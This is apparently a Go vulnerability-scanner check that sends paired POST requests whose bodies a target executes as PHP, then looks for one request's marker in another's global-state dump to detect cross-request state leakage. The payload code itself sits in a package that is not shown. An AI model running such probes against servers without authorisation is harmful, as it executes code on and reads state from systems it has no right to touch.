package scanner

import (
	"context"
	"fmt"
	"net/http"
	"strings"

	"woxeshell/internal/payload"
)

func (s *Scanner) check109619(ctx context.Context, target string) (vulnerable, executed bool, evidence []string) {
	for i := 0; i < s.opts.Pairs; i++ {
		select {
		case <-ctx.Done():
			return vulnerable, executed, evidence
		default:
		}

		mA, bodyA := payload.NewMarker()
		mB := payload.MarkerPrefix + payload.RandomHex(12)
		bodyB := payload.GlobalsDumpBody(mB)

		urlA := addQueryParam(target, "p2s", mA)
		reqA, err := http.NewRequestWithContext(ctx, "POST", urlA, strings.NewReader(bodyA))
		if err != nil {
			continue
		}
		s.applyHeaders(reqA)
		reqA.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		reqA.Header.Set("X-P2S-Marker", mA)

		respA, err := s.doWithRetry(ctx, reqA)
		if err != nil {
			if isCtxErr(err) {
				return vulnerable, executed, evidence
			}
			evidence = append(evidence, fmt.Sprintf("109619: request A of pair %d failed: %v", i+1, err))
			continue
		}
		textA := readAndClose(respA, 128<<10, 64<<10)
		if !strings.Contains(textA, payload.SuccessCheck(mA)) {
			continue
		}
		executed = true

		urlB := addQueryParam(target, "cb", payload.RandomHex(6))
		reqB, err := http.NewRequestWithContext(ctx, "POST", urlB, strings.NewReader(bodyB))
		if err != nil {
			continue
		}
		s.applyHeaders(reqB)
		reqB.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		respB, err := s.doWithRetry(ctx, reqB)
		if err != nil {
			if isCtxErr(err) {
				return vulnerable, executed, evidence
			}
			evidence = append(evidence, fmt.Sprintf("109619: request B of pair %d failed: %v", i+1, err))
			continue
		}
		textB := readAndClose(respB, 256<<10, 64<<10)

		bExec := strings.Contains(textB, payload.SuccessCheck(mB))
		leak := strings.Contains(textB, mA)
		if bExec && leak {
			evidence = append(evidence,
				fmt.Sprintf("109619: marker from request A (pair %d) found in response B global-state dump", i+1),
				"109619: stale request-owned global state observed on the same worker",
			)
			return true, executed, evidence
		}
		if leak && !bExec {
			
			evidence = append(evidence,
				fmt.Sprintf("109619: request A marker seen in response B of pair %d without execution proof; not counted (possible cache)", i+1))
		}
	}

	if executed {
		evidence = append(evidence,
			fmt.Sprintf("109619: PHP execution observed but no stale-state leak in %d pair(s)", s.opts.Pairs))
	} else if len(evidence) == 0 {
		evidence = append(evidence,
			"109619: PHP execution precondition not met (POST body is not executed as PHP)")
	}
	return vulnerable, executed, evidence
}
